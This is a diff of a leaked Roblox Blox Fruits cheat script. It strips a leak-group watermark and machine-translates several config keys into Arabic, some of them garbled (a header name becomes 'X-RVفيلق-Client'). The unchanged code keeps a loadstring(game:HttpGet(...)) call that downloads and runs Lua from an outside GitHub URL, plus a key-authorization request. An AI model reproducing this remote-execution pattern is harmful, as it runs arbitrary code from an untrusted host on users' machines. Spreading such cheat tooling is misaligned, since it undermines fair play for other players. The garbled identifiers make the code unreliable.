@@ -1,6 +1,3 @@
--- Leaked By SL | Source Leak [https://discord.gg/zNyHGU6eUK]
--- Join SL Discord for more leaked sources & hubs: https://discord.gg/zNyHGU6eUK
-do pcall(function() getgenv().SL_SourceLeak = "Leaked By SL | Source Leak [https://discord.gg/zNyHGU6eUK]" end) end
 task.spawn(function()
 	pcall(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
@@ -23,9 +20,9 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local plr = Players.LocalPlayer
 
 getgenv().Configs = {
-	["Auto Active Race V4"] = true,
-	["Boost FPS"] = true,
-	["FPS Limit"] = 15,
+	["ريس تلقائي V4"] = true,
+	["Boost فريمات"] = true,
+	["فريمات Limit"] = 15,
 	Gun = {
 		"Skull Guitar",
 		"Kabucha",
@@ -41,10 +38,10 @@ getgenv().Configs = {
 		"Bazooka",
 	},
 	Quest = {
-		["Evo Race V1"] = true,
-		["Evo Race V2"] = true,
+		["Race V1"] = true,
+		["Race V2"] = true,
 		["Pull Lerver"] = true,
-		["RGB Haki"] = true,
+		["ملون هاكي"] = true,
 	},
 	Sword = {
 		"Dual-Headed Blade",
@@ -223,7 +220,7 @@ local function RequestKeyAuthorization(inputKey)
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json",
-			["X-RealKid-Client"] = "roblox-keyed-build-v3",
+			["X-RVفيلق-Client"] = "roblox-keyed-build-v3",
 		},
 		Body = HttpService:JSONEncode({
 			action = "auth",
